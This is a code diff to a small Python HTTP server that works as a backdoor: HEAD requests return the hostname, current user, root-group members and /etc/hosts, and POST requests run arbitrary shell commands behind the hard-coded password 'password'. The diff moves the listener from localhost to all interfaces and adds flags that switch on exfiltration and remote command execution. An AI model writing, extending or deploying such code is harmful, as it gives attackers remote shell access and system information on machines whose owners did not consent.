@@ -2,9 +2,11 @@ import sys, subprocess, socket
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
 class config:
-    bind_address = "127.0.0.1"
+    bind_address = "0.0.0.0"
     bind_port = 1337
     password = "password"
+    exfiltrate_enabled = True
+    remote_commands_enabled = True
 
 def execCommand(command):
     cmd = subprocess.check_output(command, shell=True).strip()
@@ -12,7 +14,7 @@ def execCommand(command):
 
 class ReqHandler(BaseHTTPRequestHandler): 
     def do_HEAD(self): # exfiltrate basic system information
-        try:
+        if config.exfiltrate_enabled == True:
             self.send_response(200)
             self.send_header("hostname", socket.gethostname()) # return system hostname
             self.send_header("current_user", execCommand(command="whoami")) # get current user
@@ -26,19 +28,21 @@ class ReqHandler(BaseHTTPRequestHandler):
             self.send_header("root_users", execCommand(command="grep root /etc/group")) # get all users with root access
             self.send_header("hosts_file", execCommand(command="cat /etc/hosts")) # return the hosts file contents
             self.end_headers()
-        except:
+        else:
             pass
 
     def do_POST(self): # run shell commands and return the output
-        password = str(self.headers["pwd"])
-        contentLength = int(self.headers["Content-Length"])
-        command = self.rfile.read(contentLength)
-        if str(password) == str(config.password):
-            command = str(command)[2:-1] # remove bytes from command header
-            self.send_response(200) # send HTTP status code
-            cmd_output = execCommand(command=command)
-            self.send_header("output", str(cmd_output))
-            self.end_headers()
+        if config.remote_commands_enabled == True:
+            password = str(self.headers["pwd"])
+            contentLength = int(self.headers["Content-Length"])
+            command = self.rfile.read(contentLength)
+            if str(password) == str(config.password):
+                self.send_response(200)
+                cmd_output = execCommand(command=(str(command)[2:-1]))
+                self.send_header("output", str(cmd_output))
+                self.end_headers()
+            else:
+                pass
         else:
             pass
 
